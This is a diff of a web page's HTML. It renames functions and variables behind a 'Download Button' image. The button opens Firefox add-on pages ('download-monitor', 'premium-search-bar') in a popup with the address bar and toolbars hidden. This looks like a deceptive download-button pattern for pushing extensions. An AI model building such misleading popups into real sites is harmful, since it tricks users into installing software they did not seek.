@@ -134,12 +134,12 @@
 
 
 
-     <button onclick="openRandomLink()">
+     <button onclick="openRandomLinks()">
     <img src="https://archive.org/download/download-button-png//download-button-png.png" alt="Download Button">
 </button>
 
 <script>
-    function openRandomLink() {
+    function openRandomLinks() {
         var firefoxLinks = [
             
             "https://addons.mozilla.org/en-US/firefox/addon/download-monitor/"
@@ -160,16 +160,16 @@
 
 <script>
     function openRandomLink() {
-        var firefoxLinks = [
+        var firefoxLink = [
             "https://addons.mozilla.org/en-US/firefox/addon/premium-search-bar/"
            
         ];
-        var randomIndex = Math.floor(Math.random() * firefoxLinks.length);
+        var randomIndex = Math.floor(Math.random() * firefoxLink.length);
         
         // Customized window features
         var features = "width=400,height=600,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes";
 
-        window.open(firefoxLinks[randomIndex], "_blank", features);
+        window.open(firefoxLink[randomIndex], "_blank", features);
     }
 </script>
 
